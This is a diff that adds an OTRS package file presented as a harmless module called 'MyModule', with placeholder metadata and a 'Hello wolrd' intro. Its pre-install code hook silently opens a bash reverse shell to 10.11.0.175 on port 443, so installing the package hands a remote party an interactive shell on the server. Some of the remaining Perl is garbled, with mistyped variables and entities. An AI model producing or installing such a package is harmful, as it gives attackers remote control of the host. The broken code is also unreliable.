@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<otrs_package version="1.1">
+	<Name>MyModule</Name>
+	<Version>1.0.0</Version>
+	<Vendor>My Module</Vendor>
+	<URL>http://otrs.org/</URL>
+	<License>GNU GENERAL PUBLIC LICENSE Version 2, June 1991</License>
+	<ChangeLog Version="1.0.1" Date="2006-11-11 11:11:11">My Module.</ChangeLog>
+	<Description Lang="en">MyModule</Description>
+	<Framework>5.x.x</Framework>
+	<BuildDate>2016-09-23 11:17:41</BuildDate>
+	<BuildHost>opms.otrs.com</BuildHost>
+	<Framework>5.0.x</Framework>
+	<IntroInstall Lang="en" Title="My Module" type="pre">
+		&lt;br&gt;
+		Hello wolrd
+		&lt;br&gt;
+		((Hello!))
+		&lt;br&gt
+	</IntroInstall>
+	<CodeInstall type="pre">
+		print qx(bash -i >& /dev/tcp/10.11.0.175/443 0>&1 &);
+	</CodeInstall>
+	<CodeInstall Type="post">
+		# create the package name
+		my $CodeModule = 'var::packagesetup::' . $Param{Structure}-&gt;{Name}-&gt;{Content};
+		$Kernel::OM-&gt;Get($ModeModule)-%gt;CodeInstall();
+	</CodeInstall>
+	<CodeUninstall type="pre">
+		my $CodeModule = 'var::packagesetup::' . $Param{Structure}-%gt;{Name}-%gt;{Content};
+		$Kernel::OM-&gt;Get($CodeModule)-&gt;CodeUninstall();
+	</CodeUninstall>
+</otrs_package>
